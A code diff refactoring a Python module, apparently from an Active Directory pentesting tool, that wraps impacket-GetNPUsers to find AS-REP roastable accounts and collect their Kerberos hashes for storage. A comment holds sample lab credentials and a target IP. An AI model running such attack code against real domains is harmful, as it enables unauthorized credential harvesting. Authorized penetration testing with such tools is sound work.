@@ -4,13 +4,41 @@ import subprocess
 from ..db.database import upsert_user_hash
 # run_kerberoast('gikyon.local', 'Administrator', 'Admin@123', '192.168.80.132')
 # app/utils/
-def check_asreproast(domain, username, password, target_ip, *, ntlm_hash=None):
-    command = ['impacket-GetNPUsers', '-dc-ip', target_ip]
+
+
+def _command_output(output):
+    return "\n".join(
+        part.strip()
+        for part in (output.stdout, output.stderr)
+        if part and part.strip()
+    )
+
+
+def _failure_message(output, default):
+    combined = _command_output(output)
+    if not combined:
+        return default
+
+    lines = [line.strip() for line in combined.splitlines() if line.strip()]
+    useful_lines = [
+        line for line in lines
+        if not line.startswith("Impacket v") and "Copyright" not in line
+    ]
+    return "\n".join(useful_lines[-5:]) or default
+
+
+def _base_command(domain, username, password, target_ip, *, ntlm_hash=None):
+    command = ["impacket-GetNPUsers", "-dc-ip", target_ip]
     if ntlm_hash:
-        command += ['-hashes', f":{ntlm_hash}"]
+        command += ["-hashes", f":{ntlm_hash}"]
         creds = f"{domain}/{username}"
     else:
         creds = f"{domain}/{username}:{password}"
+    return command, creds
+
+
+def check_asreproast(domain, username, password, target_ip, *, ntlm_hash=None):
+    command, creds = _base_command(domain, username, password, target_ip, ntlm_hash=ntlm_hash)
     command.append(creds)
 
     output = subprocess.run(
@@ -18,35 +46,35 @@ def check_asreproast(domain, username, password, target_ip, *, ntlm_hash=None):
         capture_output=True,
         text=True
     )
+    if output.returncode != 0:
+        return [f"AS-REP check failed: {_failure_message(output, 'verify target reachability and credentials.')}"]
 
-    result_withbanner = output.stdout.splitlines()
-    result = result_withbanner[4:]
     formatted = []
-    for line in result:
+    for line in output.stdout.splitlines():
+        stripped = line.strip()
+        if not stripped or stripped.startswith("Impacket v") or stripped.startswith("Name ") or set(stripped) == {"-"}:
+            continue
         information = line.split()
         if len(information) > 3:
             formatted.append(f"{information[1]} - {information[0]}")
-    return formatted
+    return formatted or ["No AS-REP roastable users found."]
 
 
 def run_asreproast(domain, username, password, target_ip, *, ntlm_hash=None):
-    command = ['impacket-GetNPUsers', '-dc-ip', target_ip]
-    if ntlm_hash:
-        command += ['-hashes', f":{ntlm_hash}"]
-        creds = f"{domain}/{username}"
-    else:
-        creds = f"{domain}/{username}:{password}"
-    command += [creds, '-request']
+    command, creds = _base_command(domain, username, password, target_ip, ntlm_hash=ntlm_hash)
+    command += ["-request", creds]
 
     output = subprocess.run(
         command,
         capture_output=True,
         text=True
     )
+    if output.returncode != 0:
+        return [f"AS-REP roasting failed: {_failure_message(output, 'verify target reachability and credentials.')}"]
 
     result = []
 
-    for line in output.stdout.splitlines():
+    for line in _command_output(output).splitlines():
         if "$krb5asrep$" in line:
             parsed = _parse_asreproast_hash(line)
             if parsed:
@@ -61,7 +89,7 @@ def run_asreproast(domain, username, password, target_ip, *, ntlm_hash=None):
                     "timestamp": datetime.now(timezone.utc).isoformat(),
                 })
     
-    return result
+    return result or ["AS-REP roasting completed, but no AS-REP hashes were returned."]
 
 
 def _parse_asreproast_hash(hash_line):
